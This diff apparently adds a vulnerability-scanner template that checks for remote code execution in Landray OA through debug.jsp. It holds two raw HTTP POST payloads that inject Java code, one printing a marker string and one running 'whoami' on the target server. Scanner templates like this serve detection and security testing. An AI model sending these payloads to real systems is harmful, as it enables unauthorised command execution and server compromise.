@@ -1,0 +1,41 @@
+id: landray-oa-debug-rce
+info:
+  name: Landray OA debug.jsp Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Landray OA debug.jsp contains security vulnerabilities that allow attackers to execute arbitrary script code, leading to server compromise.
+  reference:
+    - https://mp.weixin.qq.com/s/0xu7K726hp1xfnShhjGbVQ
+http:
+  - raw:
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        var={"body":{"file":"/sys/common/debug.jsp"}}&fdCode=out.println(new%20String(new%20sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+  - raw:
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        var={"body":{"file":"/sys/common/debug.jsp"}}&fdCode=java.io.InputStream in = Runtime.getRuntime().exec("whoami").getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); };
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root|admin|system"
